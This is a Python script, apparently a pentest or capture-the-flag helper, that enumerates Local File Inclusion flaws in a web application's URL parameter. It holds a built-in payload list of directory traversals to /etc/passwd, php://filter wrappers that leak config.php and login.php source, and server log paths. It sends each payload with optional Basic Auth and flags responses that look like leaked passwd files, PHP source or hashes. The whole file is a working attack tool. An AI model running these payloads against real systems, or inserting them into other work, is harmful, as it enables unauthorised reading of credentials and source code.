#!/usr/bin/env python3
"""
lfi_enum.py — Minimal Local File Inclusion enumerator with Basic Auth.
Allows built-in payloads, custom payloads, and payload lists.

Behavior:
- If NO payload-related options are provided (--payload, --payloads, --common),
  the tool defaults to using the built-in common payloads.
"""

import argparse
import sys
import os
import time
import requests
import re
from urllib.parse import quote


COMMON_PAYLOADS = [
    # Basic paths and traversals
    "home",
    "about",
    "etc/passwd",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "....//....//etc/passwd",
    "....//....//....//etc/passwd",

    # PHP filter wrappers to leak source
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=login.php",
    "php://filter/convert.base64-encode/resource=config.php",

    # Common logs
    "/var/log/auth.log",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
]


def load_payloads_from_file(path):
    results = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                p = line.strip()
                if not p or p.startswith("#"):
                    continue
                results.append(p)
    except Exception as e:
        print(f"[!] Error reading payload file '{path}': {e}")
    return results


def classify_response(url, resp_text, status_code):
    if status_code == 200:
        if "root:" in resp_text:      
            return "LIKELY_PASSWD"
        if "<?php" in resp_text:
            return "PHP_SOURCE"
        if re.search(r"[0-9a-f]{32}", resp_text, re.I):
            return "MAYBE_HASH"
        if len(resp_text.strip()) > 0:
            return "OK"
        return "EMPTY"
    elif status_code in (403, 401):
        return "BLOCKED"
    elif status_code == 404:
        return "NOTFOUND"
    else:
        return f"HTTP {status_code}"


def main():
    ap = argparse.ArgumentParser(description="Minimal LFI enumerator with Basic Auth.")
    ap.add_argument("base_url", help="Base LFI URL, e.g. http://host/index.php?page=")

    ap.add_argument("-u", "--username", help="Basic Auth username")
    ap.add_argument("-p", "--password", help="Basic Auth password")

    ap.add_argument("--payload", action="append", default=[],
                    help="Single custom payload (may be repeated)")
    ap.add_argument("--payloads", help="File containing additional payloads")
    ap.add_argument("--common", action="store_true",
                    help="Include built-in common payloads explicitly")
    ap.add_argument("--delay", type=float, default=0.0,
                    help="Delay between requests (seconds)")

    args = ap.parse_args()

    user_specified_payloads = bool(args.payload or args.payloads or args.common)

    payloads = []

    if args.common:
        payloads.extend(COMMON_PAYLOADS)

    if args.payload:
        payloads.extend(args.payload)

    if args.payloads:
        payloads.extend(load_payloads_from_file(args.payloads))

    if not user_specified_payloads:
        print("[*] No payload options provided; defaulting to built-in common payloads.")
        payloads.extend(COMMON_PAYLOADS)

    seen = set()
    final_payloads = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            final_payloads.append(p)

    if not final_payloads:
        print("[!] No payloads resolved after processing options.")
        sys.exit(1)

    s = requests.Session()
    auth = None
    if args.username and args.password:
        auth = (args.username, args.password)

    print(f"[+] Target base: {args.base_url}")
    print(f"[+] Total payloads: {len(final_payloads)}\n")

    for p in final_payloads:
        test_url = args.base_url + quote(p, safe="/:")
        try:
            r = s.get(test_url, auth=auth, timeout=8, allow_redirects=True)
        except requests.RequestException as e:
            print(f"[-] {test_url:<90} ERROR: {e.__class__.__name__}")
            continue

        resp_text = r.text if "text" in r.headers.get("Content-Type", "") else ""
        classification = classify_response(test_url, resp_text, r.status_code)

        print(f"{test_url:<90} {classification}")

        if args.delay > 0:
            time.sleep(args.delay)


if __name__ == "__main__":
    main()
